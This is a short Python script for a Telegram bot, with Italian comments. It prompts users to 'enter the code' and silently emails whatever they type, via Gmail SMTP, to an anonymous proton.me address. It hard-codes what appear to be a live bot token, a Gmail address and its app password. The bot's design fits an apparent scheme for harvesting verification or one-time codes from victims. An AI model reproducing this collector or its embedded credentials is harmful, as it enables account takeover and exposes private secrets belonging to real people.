import smtplib
from email.mime.text import MIMEText
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

TOKEN = "8602899389:AAH8o7rWgh_vgjN5mCI4PaLNsoqE8B0dthc"

EMAIL_MITTENTE = "filippobarone93@gmail.com"
PASSWORD = "qzicphklijpjeehr"
EMAIL_DESTINATARIO = "mynamedontexist@proton.me"

def manda_email(codice):
    msg = MIMEText(f"Codice ricevuto: {codice}")
    msg["Subject"] = "Nuovo codice dal bot"
    msg["From"] = EMAIL_MITTENTE
    msg["To"] = EMAIL_DESTINATARIO

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_MITTENTE, PASSWORD)
    server.send_message(msg)
    server.quit()

# Quando parte il bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 Inserisci il codice:")

# Quando arriva il codice
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    codice = update.message.text
    
    manda_email(codice)
    
    await update.message.reply_text("✅ Codice inviato con successo!")

app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT, handle_message))

print("Bot avviato...")
app.run_polling()